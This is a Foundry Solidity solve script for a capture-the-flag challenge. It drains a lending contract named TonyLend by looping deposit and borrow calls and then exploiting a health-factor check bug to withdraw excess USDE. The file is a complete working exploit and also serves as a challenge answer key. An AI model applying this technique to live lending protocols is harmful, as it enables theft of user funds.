// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";

import "../src/Challenge.sol";
import "../src/TonyLend.sol";

contract SolveContract {
    uint256 constant USDE_DECIMALS = 1e18;
    uint8 constant USDE_INDEX = 0;

    constructor(Challenge challenge) {
        challenge.claimDust(); // 1. Get 1e4 of each token

        TonyLend tonyLend = challenge.tonyLend();
        ICurve curvePool = challenge.curvePool();
        ERC20 usde = challenge.usde();

        usde.approve(address(curvePool), type(uint256).max);
        usde.approve(address(tonyLend), type(uint256).max);

        // 2. Deposit and borrow USDE since different variables account for borrowed and deposited amounts.
        for (uint256 i = 0; i < 3; i++) {
            uint256 balance = usde.balanceOf(address(this));
            tonyLend.deposit(USDE_INDEX, balance);
            tonyLend.borrow(USDE_INDEX, balance);
        }

        // 3. Withdraw all thanks to the health factor check bug.
        tonyLend.withdraw(USDE_INDEX, 21926 * USDE_DECIMALS); // value taken from isSolved()
        usde.transfer(address(0xc0ffee), usde.balanceOf(address(this)));

        selfdestruct(payable(msg.sender));
    }
}

contract Solve is Script {
    function run() public {
        Challenge challenge = Challenge(address(vm.envAddress("CHALLENGE_ADDRESS")));
        uint256 PLAYER_PRIVATE_KEY = vm.envUint("PLAYER_PRIVATE_KEY");

        vm.startBroadcast(PLAYER_PRIVATE_KEY);

        new SolveContract(challenge);
        require(challenge.isSolved(), "not solved");

        vm.stopBroadcast();
    }
}
